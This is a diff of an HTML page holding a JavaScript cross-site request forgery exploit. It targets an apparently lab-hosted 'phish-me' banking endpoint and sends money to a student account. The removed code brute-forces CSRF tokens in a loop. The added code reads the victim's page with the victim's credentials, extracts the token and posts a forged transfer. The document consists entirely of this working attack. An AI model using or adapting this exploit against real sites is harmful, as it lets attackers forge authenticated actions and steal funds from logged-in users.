@@ -2,32 +2,30 @@
 <html>
 <body>
 <script>
-    const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";
-    const myUsername = "z5609537";
-    const amount = "100";
-
-    async function bruteForceCSRF() {
-        for (let i = 1; i <= 10000; i++) {
-            const token = btoa(i.toString());
-            const formData = new URLSearchParams();
-            formData.append('username', myUsername);
-            formData.append('amount', amount);
-            formData.append('csrf_token', token);
-            fetch(targetUrl, {
-                method: 'POST',
-                mode: 'no-cors',
-                credentials: 'include',
-                body: formData,
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                }
-            });
-            if (i % 10 === 0) {
-                await new Promise(r => setTimeout(r, 200));
+async function exploit() {
+    // 先获取bot的页面拿csrf token
+    const resp = await fetch('https://phish-me.quoccacorp.com/', {
+        credentials: 'include'
+    });
+    const text = await resp.text();
+    const match = text.match(/name="csrf_token" value="([^"]+)"/);
+    if (match) {
+        const token = match[1];
+        const formData = new URLSearchParams();
+        formData.append('username', 'z5609537');
+        formData.append('amount', '100');
+        formData.append('csrf_token', token);
+        await fetch('https://phish-me.quoccacorp.com/api/transfer', {
+            method: 'POST',
+            credentials: 'include',
+            body: formData,
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
             }
-        }
+        });
     }
-    bruteForceCSRF();
+}
+exploit();
 </script>
 </body>
 </html>
